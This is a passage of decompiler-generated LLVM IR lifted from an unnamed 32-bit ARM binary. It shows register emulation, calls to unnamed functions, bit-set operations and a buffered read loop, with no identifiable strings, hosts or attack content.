  store i32 %v2_8a60, i32* @r0, align 4
  %v3_8a64 = inttoptr i32 %v2_8a60 to i8*
  %v4_8a64 = call i32 @function_124a8(i8* %v3_8a64, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 %v4_8a64, i32* %r0.global-to-local, align 4
  store i32 %v6_81bc, i32* %ip.global-to-local, align 4
  %v1_8a6c = load i32, i32* %sb.global-to-local, align 4
  %v3_8a6c = icmp uge i32 %v6_81bc, %v1_8a6c
  store i1 %v3_8a6c, i1* %cpsr_c.global-to-local, align 1
  %v9_8a6c = icmp eq i32 %v6_81bc, %v1_8a6c
  store i1 %v9_8a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8a6c, label %dec_label_pc_8b44, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_887c
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8a78 = call i32 @function_11be8(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a80 = call i32 @function_12480(i8* %v1_88b0)
  %v0_8a84 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a84, i32* %r1.global-to-local, align 4
  store i32 %v2_8a80, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8a90 = inttoptr i32 %v0_8a84 to i32*
  %v3_8a90 = call i32 @function_11b24(i32 35, i32* %v2_8a90)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8a90, i32* %r1.global-to-local, align 4
  %v1_8a9c = load i32, i32* @r4, align 4
  %v2_8a9c = add i32 %v1_8a9c, %stack_var_-20860.0.ph
  store i32 %v2_8a9c, i32* @r0, align 4
  %v2_8aa0 = inttoptr i32 %v2_8a9c to i8*
  %v3_8aa0 = call i32 @function_124a8(i8* %v2_8aa0, i32 %v3_8a90)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8aa8 = call i32 @function_11b48(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ab0 = call i32 @function_12480(i8* %v1_88b0)
  %v2_8ab8 = add i32 %v2_8ab0, %stack_var_-20860.0.ph
  store i32 %v2_8ab8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v3_8ac0 = inttoptr i32 %v2_8ab8 to i8*
  %v4_8ac0 = call i32 @function_124a8(i8* %v3_8ac0, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ac8 = call i32 @function_12480(i8* %v1_88b0)
  %v0_8acc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8acc, i32* %r1.global-to-local, align 4
  store i32 %v2_8ac8, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8ad8 = inttoptr i32 %v0_8acc to i32*
  %v3_8ad8 = call i32 @function_11b24(i32 40, i32* %v2_8ad8)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8ad8, i32* %r1.global-to-local, align 4
  %v2_8ae4 = add i32 %v2_8ac8, %stack_var_-20860.0.ph
  store i32 %v2_8ae4, i32* @r0, align 4
  %v2_8ae8 = inttoptr i32 %v2_8ae4 to i8*
  %v3_8ae8 = call i32 @function_124a8(i8* %v2_8ae8, i32 %v3_8ad8)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af0 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18504.24 to i32), i32* %r1.global-to-local, align 4
  %v2_8afc = add i32 %v2_8af0, %stack_var_-20860.0.ph
  store i32 %v2_8afc, i32* @r0, align 4
  %v2_8b00 = inttoptr i32 %v2_8afc to i8*
  %v3_8b00 = call i32 @function_124a8(i8* %v2_8b00, i32 ptrtoint (i32* @global_var_18504.24 to i32))
  store i32 %v6_81bc, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @function_12480(i8* %v1_8b08)
  store i32 %v2_8b08, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b14 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b20 = add i32 %v2_8b14, %stack_var_-20860.0.ph
  store i32 %v2_8b20, i32* %r2.global-to-local, align 4
  %v0_8b24 = load i32, i32* @r4, align 4
  store i32 %v0_8b24, i32* %r0.global-to-local, align 4
  %v3_8b28 = trunc i32 %v0_8b24 to i8
  %v4_8b28 = call i32 @function_12974(i8 %v3_8b28, i32 10, i32 %v2_8b20)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b30 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8b3c = add i32 %v2_8b30, %stack_var_-20860.0.ph
  store i32 %v2_8b3c, i32* @r0, align 4
  %v3_8b40 = inttoptr i32 %v2_8b3c to i8*
  %v4_8b40 = call i32 @function_124a8(i8* %v3_8b40, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 %v4_8b40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b44

dec_label_pc_8b44:                                ; preds = %dec_label_pc_887c, %dec_label_pc_8a74
  %v0_8b44 = load i32, i32* @r6, align 4
  %v1_8b44 = add i32 %v0_8b44, 16
  %v2_8b44 = inttoptr i32 %v1_8b44 to i32*
  %v3_8b44 = load i32, i32* %v2_8b44, align 4
  store i32 %v3_8b44, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b48 = icmp eq i32 %v3_8b44, 0
  store i1 %v2_8b48, i1* %cpsr_z.global-to-local, align 1
  %tmp177 = icmp slt i32 %v3_8b44, 1
  br i1 %tmp177, label %dec_label_pc_8bf0, label %dec_label_pc_8b50

dec_label_pc_8b50:                                ; preds = %dec_label_pc_8b44
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b54 = call i32 @function_12480(i8* %v1_88b0)
  %v2_8b5c = add i32 %v2_8b54, %stack_var_-20860.0.ph
  store i32 %v2_8b5c, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18514.32 to i32), i32* %r1.global-to-local, align 4
  %v3_8b64 = inttoptr i32 %v2_8b5c to i8*
  %v4_8b64 = call i32 @function_124a8(i8* %v3_8b64, i32 ptrtoint ([9 x i8]* @global_var_18514.32 to i32))
  store i32 %v4_8b64, i32* %r0.global-to-local, align 4
  %v0_8b68 = load i32, i32* @r6, align 4
  %v1_8b68 = add i32 %v0_8b68, 16
  %v2_8b68 = inttoptr i32 %v1_8b68 to i32*
  %v3_8b68 = load i32, i32* %v2_8b68, align 4
  store i32 %v3_8b68, i32* %r3.global-to-local, align 4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b70 = icmp eq i32 %v3_8b68, 0
  store i1 %v2_8b70, i1* %cpsr_z.global-to-local, align 1
  %v0_8b74 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8b74, i32* %stack_var_-44, align 4
  %tmp178 = icmp slt i32 %v3_8b68, 1
  br i1 %tmp178, label %dec_label_pc_8bd8, label %dec_label_pc_8b7c

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b50, %dec_label_pc_8b7c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b80 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_8b88 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8b90 = and i32 %v3_8b88, 33554432
  %v2_8b90 = icmp ne i32 %v1_8b90, 0
  store i1 %v2_8b90, i1* %cpsr_c.global-to-local, align 1
  %v3_8b90 = mul i32 %v3_8b88, 128
  %v1_8b94 = add i32 %v3_8b90, 1472
  %v2_8b98 = add i32 %v2_8b80, %stack_var_-20860.0.ph
  store i32 %v2_8b98, i32* @r0, align 4
  %v0_8b9c = load i32, i32* @r5, align 4
  %v2_8b9c = add i32 %v1_8b94, %v0_8b9c
  store i32 %v2_8b9c, i32* %r1.global-to-local, align 4
  %v2_8ba0 = inttoptr i32 %v2_8b98 to i8*
  %v3_8ba0 = call i32 @function_124a8(i8* %v2_8ba0, i32 %v2_8b9c)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ba8 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18520.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8bb4 = add i32 %v2_8ba8, %stack_var_-20860.0.ph
  store i32 %v2_8bb4, i32* @r0, align 4
  %v3_8bb8 = inttoptr i32 %v2_8bb4 to i8*
  %v4_8bb8 = call i32 @function_124a8(i8* %v3_8bb8, i32 ptrtoint ([3 x i8]* @global_var_18520.34 to i32))
  store i32 %v4_8bb8, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_8bc0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8bc0, i32* %r3.global-to-local, align 4
  %v0_8bc4 = load i32, i32* @r6, align 4
  %v1_8bc4 = add i32 %v0_8bc4, 16
  %v2_8bc4 = inttoptr i32 %v1_8bc4 to i32*
  %v3_8bc4 = load i32, i32* %v2_8bc4, align 4
  store i32 %v3_8bc4, i32* %r2.global-to-local, align 4
  %v1_8bc8 = add i32 %v3_8bc0, 1
  store i32 %v1_8bc8, i32* %ip.global-to-local, align 4
  %v3_8bcc = icmp uge i32 %v3_8bc4, %v1_8bc8
  store i1 %v3_8bcc, i1* %cpsr_c.global-to-local, align 1
  %v9_8bcc = icmp eq i32 %v3_8bc4, %v1_8bc8
  store i1 %v9_8bcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8bc8, i32* %stack_var_-44, align 4
  %v8_8bd4 = icmp sgt i32 %v3_8bc4, %v1_8bc8
  br i1 %v8_8bd4, label %dec_label_pc_8b7c, label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b7c, %dec_label_pc_8b50
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bdc = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8be8 = add i32 %v2_8bdc, %stack_var_-20860.0.ph
  store i32 %v2_8be8, i32* @r0, align 4
  %v3_8bec = inttoptr i32 %v2_8be8 to i8*
  %v4_8bec = call i32 @function_124a8(i8* %v3_8bec, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 %v4_8bec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8bf0

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8b44, %dec_label_pc_8bd8
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bf4 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8c00 = add i32 %v2_8bf4, %stack_var_-20860.0.ph
  store i32 %v2_8c00, i32* @r0, align 4
  %v3_8c04 = inttoptr i32 %v2_8c00 to i8*
  %v4_8c04 = call i32 @function_124a8(i8* %v3_8c04, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32))
  store i32 %v4_8c04, i32* %r0.global-to-local, align 4
  store i32 %v6_81bc, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c0c, label %dec_label_pc_8c2c, label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8bf0
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c18 = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81bc, i32* %r1.global-to-local, align 4
  %v2_8c24 = add i32 %v2_8c18, %stack_var_-20860.0.ph
  store i32 %v2_8c24, i32* @r0, align 4
  %v2_8c28 = inttoptr i32 %v2_8c24 to i8*
  %v3_8c28 = call i32 @function_124a8(i8* %v2_8c28, i32 %v6_81bc)
  store i32 %v3_8c28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c2c

dec_label_pc_8c2c:                                ; preds = %dec_label_pc_8bf0, %dec_label_pc_8c14
  %v0_8c2c = load i32, i32* @r5, align 4
  %v1_8c2c = add i32 %v0_8c2c, 1440
  store i32 %v1_8c2c, i32* %r4.global-to-local, align 4
  %v0_8c30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8c30, i32* %r0.global-to-local, align 4
  store i32 %v1_8c2c, i32* %r1.global-to-local, align 4
  %v2_8c38 = inttoptr i32 %v0_8c30 to i8*
  %v3_8c38 = call i32 @function_12860(i8* %v2_8c38, i32 %v1_8c2c)
  store i32 %v3_8c38, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c3c = icmp eq i32 %v3_8c38, 0
  store i1 %v2_8c3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c3c, label %dec_label_pc_967c, label %dec_label_pc_8c44

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8c2c, %dec_label_pc_967c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c48 = load i32, i32* @r6, align 4
  %v1_8c48 = add i32 %v0_8c48, -1452
  %v2_8c48 = inttoptr i32 %v1_8c48 to i32*
  %v3_8c48 = load i32, i32* %v2_8c48, align 4
  store i32 %v3_8c48, i32* @r4, align 4
  %v2_8c4c = call i32 @function_12480(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_8c4c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c5c = load i32, i32* @r4, align 4
  store i32 %v0_8c5c, i32* %r0.global-to-local, align 4
  %v4_8c60 = call i32 @function_13884(i32 %v0_8c5c, i32 %stack_var_-20860.0.ph, i32 %v2_8c4c, i32 16384)
  store i32 %v4_8c60, i32* %r0.global-to-local, align 4
  %v0_8c64 = load i32, i32* @r6, align 4
  %v1_8c64 = add i32 %v0_8c64, -1452
  %v2_8c64 = inttoptr i32 %v1_8c64 to i32*
  %v3_8c64 = load i32, i32* %v2_8c64, align 4
  store i32 %v3_8c64, i32* %ip.global-to-local, align 4
  %v3_8c6c = udiv i32 %v3_8c64, 32
  store i32 %v2_86d0, i32* %r1.global-to-local, align 4
  %v3_8c74 = mul nuw nsw i32 %v3_8c6c, 4
  %v2_8c78 = add i32 %v3_8c74, %v2_86d0
  store i32 %v2_8c78, i32* %r2.global-to-local, align 4
  %v1_8c7c = add i32 %v2_8c78, -164
  %v2_8c7c = inttoptr i32 %v1_8c7c to i32*
  %v3_8c7c = load i32, i32* %v2_8c7c, align 4
  %v1_8c84 = urem i32 %v3_8c64, 32
  store i32 %v1_8c84, i32* %r0.global-to-local, align 4
  %v7_8c88 = shl i32 1, %v1_8c84
  %v8_8c88 = or i32 %v3_8c7c, %v7_8c88
  store i32 %v8_8c88, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8c88, i32* %v2_8c7c, align 4
  %v0_8c94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8c94 = trunc i32 %v0_8c94 to i8
  %v2_8c94 = load i32, i32* @r6, align 4
  %v3_8c94 = add i32 %v2_8c94, -1448
  %v4_8c94 = inttoptr i32 %v3_8c94 to i8*
  store i8 %v1_8c94, i8* %v4_8c94, align 1
  %v0_8c98 = load i32, i32* %ip.global-to-local, align 4
  %v1_8c98 = load i32, i32* @r8, align 4
  %v2_8c98 = sub i32 %v0_8c98, %v1_8c98
  %v3_8c98 = icmp uge i32 %v0_8c98, %v1_8c98
  store i1 %v3_8c98, i1* %cpsr_c.global-to-local, align 1
  %v4_8c98 = xor i32 %v1_8c98, %v0_8c98
  %v5_8c98 = xor i32 %v2_8c98, %v0_8c98
  %v6_8c98 = and i32 %v5_8c98, %v4_8c98
  %v7_8c98 = icmp slt i32 %v6_8c98, 0
  %v8_8c98 = icmp slt i32 %v2_8c98, 0
  %v9_8c98 = icmp eq i32 %v0_8c98, %v1_8c98
  store i1 %v9_8c98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_84f0, i32* %r2.global-to-local, align 4
  %v3_8ca0 = xor i1 %v8_8c98, %v7_8c98
  %v4_8ca0 = or i1 %v9_8c98, %v3_8ca0
  br i1 %v4_8ca0, label %bb180, label %bb179

bb179:                                            ; preds = %dec_label_pc_8c44
  %v6_8ca0 = add i32 %v0_8c98, 1
  store i32 %v6_8ca0, i32* @r8, align 4
  br label %bb180

bb180:                                            ; preds = %dec_label_pc_8c44, %bb179
  %v1_8ca4 = load i32, i32* @r6, align 4
  %v2_8ca4 = add i32 %v1_8ca4, -1440
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v2_84f0, i32* %v3_8ca4, align 4
  br label %dec_label_pc_85b4

dec_label_pc_8cac:                                ; preds = %dec_label_pc_856c
  %v1_8cac = add i32 %v3_8870, -1444
  %v2_8cac = inttoptr i32 %v1_8cac to i32*
  %v3_8cac = load i32, i32* %v2_8cac, align 4
  store i32 %v2_84f0, i32* %r1.global-to-local, align 4
  %v2_8cb4 = sub i32 %v2_84f0, %v3_8cac
  store i32 %v2_8cb4, i32* %r3.global-to-local, align 4
  %v2_8cb8 = icmp ugt i32 %v2_8cb4, 29
  store i1 %v2_8cb8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cb8 = icmp eq i32 %v2_8cb4, 30
  store i1 %v7_8cb8, i1* %cpsr_z.global-to-local, align 1
  %v2_8cbc = xor i1 %v7_8cb8, true
  %v3_8cbc = and i1 %v2_8cb8, %v2_8cbc
  br i1 %v3_8cbc, label %dec_label_pc_859c, label %dec_label_pc_8cc0

dec_label_pc_8cc0:                                ; preds = %dec_label_pc_8cac
  %v2_8cc0 = inttoptr i32 %v1_85d8 to i32*
  %v3_8cc0 = load i32, i32* %v2_8cc0, align 4
  store i32 %v3_8cc0, i32* %ip.global-to-local, align 4
  %v3_8cc8 = udiv i32 %v3_8cc0, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8ccc = mul nuw nsw i32 %v3_8cc8, 4
  store i32 %v3_8ccc, i32* %r2.global-to-local, align 4
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_86d8

dec_label_pc_8cdc:                                ; preds = %dec_label_pc_857c
  %v2_8cdc = inttoptr i32 %v1_85d8 to i32*
  %v3_8cdc = load i32, i32* %v2_8cdc, align 4
  store i32 %v3_8cdc, i32* %ip.global-to-local, align 4
  %v3_8ce4 = udiv i32 %v3_8cdc, 32
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  %v3_8cec = mul nuw nsw i32 %v3_8ce4, 4
  %v2_8cf0 = add i32 %v3_8cec, %v2_86d0
  store i32 %v2_8cf0, i32* %r2.global-to-local, align 4
  %v1_8cf4 = add i32 %v2_8cf0, -164
  %v2_8cf4 = inttoptr i32 %v1_8cf4 to i32*
  %v3_8cf4 = load i32, i32* %v2_8cf4, align 4
  %v1_8cf8 = urem i32 %v3_8cdc, 32
  store i32 %v1_8cf8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d00 = shl i32 1, %v1_8cf8
  %v8_8d00 = or i32 %v3_8cf4, %v7_8d00
  store i32 %v8_8d00, i32* %r1.global-to-local, align 4
  %v1_8d04 = load i32, i32* @r8, align 4
  %v2_8d04 = sub i32 %v3_8cdc, %v1_8d04
  %v3_8d04 = icmp uge i32 %v3_8cdc, %v1_8d04
  store i1 %v3_8d04, i1* %cpsr_c.global-to-local, align 1
  %v4_8d04 = xor i32 %v1_8d04, %v3_8cdc
  %v5_8d04 = xor i32 %v2_8d04, %v3_8cdc
  %v6_8d04 = and i32 %v5_8d04, %v4_8d04
  %v7_8d04 = icmp slt i32 %v6_8d04, 0
  %v8_8d04 = icmp slt i32 %v2_8d04, 0
  %v9_8d04 = icmp eq i32 %v3_8cdc, %v1_8d04
  store i1 %v9_8d04, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d00, i32* %v2_8cf4, align 4
  %v3_8d0c = xor i1 %v8_8d04, %v7_8d04
  %v4_8d0c = or i1 %v9_8d04, %v3_8d0c
  br i1 %v4_8d0c, label %dec_label_pc_85b4, label %dec_label_pc_8d10

dec_label_pc_8d10:                                ; preds = %dec_label_pc_8cdc
  %v0_8d10 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d10 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d10 = add i32 %v1_8d10, %v0_8d10
  store i32 %v2_8d10, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_8d18:                                ; preds = %dec_label_pc_879c
  %v0_8d18 = call i32 @function_13574()
  store i32 %v0_8d18, i32* %r0.global-to-local, align 4
  %v0_8d1c = load i32, i32* @sl, align 4
  %v1_8d1c = add i32 %v0_8d1c, 660
  %v2_8d1c = inttoptr i32 %v1_8d1c to i32*
  %v3_8d1c = load i32, i32* %v2_8d1c, align 4
  store i32 %v3_8d1c, i32* @r3, align 4
  %v0_8d20 = load i32, i32* %sb.global-to-local, align 4
  %v2_8d24 = icmp ugt i32 %v3_8d1c, 1023
  store i1 %v2_8d24, i1* %cpsr_c.global-to-local, align 1
  %v7_8d24 = icmp eq i32 %v3_8d1c, 1024
  store i1 %v7_8d24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_8d18, i32* %fp.global-to-local, align 4
  %v1_8d2c = add i32 %v0_8d20, 2116
  store i32 %v1_8d2c, i32* @r7, align 4
  br i1 %v7_8d24, label %dec_label_pc_8e30, label %dec_label_pc_8d34

dec_label_pc_8d34:                                ; preds = %dec_label_pc_8d18, %dec_label_pc_8e30, %dec_label_pc_8e24
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8d38 = load i32, i32* %fp.global-to-local, align 4
  %v2_8d38 = inttoptr i32 %v1_8d38 to i32*
  store i32 0, i32* %v2_8d38, align 4
  %v0_8d3c = load i32, i32* @sl, align 4
  %v1_8d3c = add i32 %v0_8d3c, 660
  %v2_8d3c = inttoptr i32 %v1_8d3c to i32*
  %v3_8d3c = load i32, i32* %v2_8d3c, align 4
  store i32 %v3_8d3c, i32* %r1.global-to-local, align 4
  %v1_8d40 = add i32 %v0_8d3c, -1452
  %v2_8d40 = inttoptr i32 %v1_8d40 to i32*
  %v3_8d40 = load i32, i32* %v2_8d40, align 4
  store i32 %v3_8d40, i32* %r0.global-to-local, align 4
  %v1_8d44 = sub i32 1024, %v3_8d3c
  store i32 %v1_8d44, i32* %r2.global-to-local, align 4
  %v0_8d48 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 16384
  store i32 %v1_8d48, i32* %r3.global-to-local, align 4
  %v0_8d4c = load i32, i32* @r7, align 4
  %v2_8d4c = add i32 %v0_8d4c, %v3_8d3c
  store i32 %v2_8d4c, i32* %r1.global-to-local, align 4
  %v4_8d50 = call i32 @function_13810(i32 %v3_8d40, i32 %v2_8d4c, i32 %v1_8d44, i32 %v1_8d48)
  store i32 %v4_8d50, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d54 = icmp eq i32 %v4_8d50, 0
  store i1 %v2_8d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d54, label %dec_label_pc_968c, label %dec_label_pc_8d5c

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8d34
  %v2_8d5c = icmp eq i32 %v4_8d50, -1
  store i1 %v2_8d5c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d5c = icmp eq i32 %v4_8d50, -1
  store i1 %v7_8d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d5c, label %dec_label_pc_96b0, label %dec_label_pc_8d64

dec_label_pc_8d64:                                ; preds = %dec_label_pc_8d5c
  %v0_8d64 = load i32, i32* @sl, align 4
  %v1_8d64 = add i32 %v0_8d64, 660
  %v2_8d64 = inttoptr i32 %v1_8d64 to i32*
  %v3_8d64 = load i32, i32* %v2_8d64, align 4
  store i32 %v2_875c, i32* %r1.global-to-local, align 4
  %v2_8d6c = add i32 %v3_8d64, %v4_8d50
  store i32 %v2_8d6c, i32* @r4, align 4
  store i32 %v2_8d6c, i32* %v2_8d64, align 4
  %v0_8d74 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d74 = load i32, i32* @sl, align 4
  %v2_8d74 = add i32 %v1_8d74, -1444
  %v3_8d74 = inttoptr i32 %v2_8d74 to i32*
  store i32 %v0_8d74, i32* %v3_8d74, align 4
  br label %dec_label_pc_8e04

dec_label_pc_8d7c:                                ; preds = %dec_label_pc_8e04
  %v1_8d7c = inttoptr i32 %v0_8e04 to i32*
  %v2_8d7c = load i32, i32* %v1_8d7c, align 4
  store i32 %v2_8d7c, i32* @r8, align 4
  %v1_8d80 = load i32, i32* @r4, align 4
  %v5_8d84 = icmp slt i32 %v3_8e04, %v1_8d80
  %storemerge49 = select i1 %v5_8d84, i32 %v3_8e04, i32 %v1_8d80
  store i32 %storemerge49, i32* @r6, align 4
  %v2_8d8c = sub i32 %v3_8e04, %storemerge49
  store i32 %v2_8d8c, i32* %r3.global-to-local, align 4
  %v2_8d90 = icmp ne i32 %v2_8d7c, 0
  store i1 %v2_8d90, i1* %cpsr_c.global-to-local, align 1
  %v7_8d90 = icmp eq i32 %v2_8d7c, 1
  store i1 %v7_8d90, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8d8c, i32* %v2_8e04, align 4
  br i1 %v7_8d90, label %dec_label_pc_8e54, label %.dec_label_pc_8da0thread-pre-split_crit_edge

.dec_label_pc_8da0thread-pre-split_crit_edge:     ; preds = %dec_label_pc_8d7c
  %v1_8d98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_8d98, i32* @r5, align 4
  br label %dec_label_pc_8da0

dec_label_pc_8da0:                                ; preds = %dec_label_pc_8e10, %.dec_label_pc_8da0thread-pre-split_crit_edge, %dec_label_pc_8e7c
  %v0_8da0 = phi i32 [ %v3_8e7c, %dec_label_pc_8e7c ], [ %v1_8d98, %.dec_label_pc_8da0thread-pre-split_crit_edge ], [ %v3_8e04, %dec_label_pc_8e10 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8da0 = icmp eq i32 %v0_8da0, 0
  store i1 %v2_8da0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8da0, label %dec_label_pc_8da8, label %dec_label_pc_8dc8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8da0
  %v0_8da8 = load i32, i32* @sl, align 4
  %v1_8da8 = add i32 %v0_8da8, 8
  %v2_8da8 = inttoptr i32 %v1_8da8 to i32*
  %v3_8da8 = load i32, i32* %v2_8da8, align 4
  store i32 %v3_8da8, i32* @r4, align 4
  %v2_8dac = icmp ne i32 %v3_8da8, 0
  store i1 %v2_8dac, i1* %cpsr_c.global-to-local, align 1
  %v7_8dac = icmp eq i32 %v3_8da8, 1
  store i1 %v7_8dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dac, label %dec_label_pc_8e84, label %dec_label_pc_8db4

dec_label_pc_8db4:                                ; preds = %dec_label_pc_8da8
  %v1_8db4 = add i32 %v0_8da8, 660
  %v2_8db4 = inttoptr i32 %v1_8db4 to i32*
  %v3_8db4 = load i32, i32* %v2_8db4, align 4
  %v0_8db8 = load i32, i32* @r6, align 4
  %v2_8db8 = sub i32 %v3_8db4, %v0_8db8
  store i32 %v2_8db8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dbc = icmp eq i32 %v2_8db8, 0
  store i1 %v2_8dbc, i1* %cpsr_z.global-to-local, align 1
  %v2_8dc0 = add i32 %v0_8da8, 12
  %v3_8dc0 = inttoptr i32 %v2_8dc0 to i32*
  store i32 %v2_8db8, i32* %v3_8dc0, align 4
  br i1 %v2_8dbc, label %dec_label_pc_9670, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8da0, %dec_label_pc_8db4, %dec_label_pc_8e84, %dec_label_pc_8f0c
  %v0_8dc8 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dc8 = icmp eq i32 %v0_8dc8, 0
  store i1 %v2_8dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8dc8, label %dec_label_pc_8e18, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8dc8
